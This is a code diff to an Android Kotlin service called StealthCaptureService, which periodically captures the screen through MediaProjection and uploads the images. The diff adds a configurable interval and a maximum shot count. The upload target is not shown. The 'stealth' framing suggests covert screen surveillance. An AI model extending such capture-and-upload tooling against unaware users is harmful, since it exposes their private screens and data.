@@ -52,10 +52,11 @@ class StealthCaptureService : Service() {
         const val ACTION_STOP = "com.example.service.ACTION_STOP_STEALTH_CAPTURE"
         const val EXTRA_RESULT_CODE = "extra_result_code"
         const val EXTRA_RESULT_DATA = "extra_result_data"
+        const val EXTRA_INTERVAL_SEC = "extra_interval_sec"
+        const val EXTRA_MAX_SHOTS = "extra_max_shots"
 
         private const val NOTIFICATION_ID = 88912
         private const val CHANNEL_ID = "stealth_capture_channel"
-        private const val CAPTURE_INTERVAL_MS = 10000L // 10 seconds
         private const val MAX_HISTORY_COUNT = 10
         private const val MAX_WIDTH_PX = 600
         private const val JPEG_QUALITY = 40
@@ -66,12 +67,22 @@ class StealthCaptureService : Service() {
 
     private var mediaProjection: MediaProjection? = null
     private var isCapturing = false
+    private var intervalSec = 10
+    private var maxShots = 0
+    private var currentShotCount = 0
 
     private val captureRunnable = object : Runnable {
         override fun run() {
             if (isCapturing) {
                 captureAndUpload()
-                handler.postDelayed(this, CAPTURE_INTERVAL_MS)
+                currentShotCount++
+                if (maxShots > 0 && currentShotCount >= maxShots) {
+                    Log.d(TAG, "Reached max stealth screenshots ($maxShots). Stopping service.")
+                    stopCaptureAndCleanup()
+                    stopSelf()
+                } else {
+                    handler.postDelayed(this, intervalSec * 1000L)
+                }
             }
         }
     }
@@ -84,6 +95,11 @@ class StealthCaptureService : Service() {
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
         val action = intent?.action
+        if (action == ACTION_START) {
+            intervalSec = intent.getIntExtra(EXTRA_INTERVAL_SEC, 10).coerceIn(1, 300)
+            maxShots = intent.getIntExtra(EXTRA_MAX_SHOTS, 0).coerceAtLeast(0)
+            currentShotCount = 0
+        }
         when (action) {
             ACTION_START -> {
                 val resultCode = intent.getIntExtra(EXTRA_RESULT_CODE, Activity.RESULT_CANCELED)
@@ -100,7 +116,7 @@ class StealthCaptureService : Service() {
                         isCapturing = true
                         handler.removeCallbacks(captureRunnable)
                         handler.post(captureRunnable)
-                        Log.d(TAG, "Stealth capture loop started.")
+                        Log.d(TAG, "Stealth capture loop started (interval: ${intervalSec}s, maxShots: $maxShots).")
                     }
                 } else {
                     // Try token from MediaProjectionHelper fallback
@@ -111,7 +127,7 @@ class StealthCaptureService : Service() {
                             isCapturing = true
                             handler.removeCallbacks(captureRunnable)
                             handler.post(captureRunnable)
-                            Log.d(TAG, "Stealth capture loop started via cached token.")
+                            Log.d(TAG, "Stealth capture loop started via cached token (interval: ${intervalSec}s, maxShots: $maxShots).")
                         }
                     } else {
                         Log.e(TAG, "Missing MediaProjection token for starting stealth capture.")
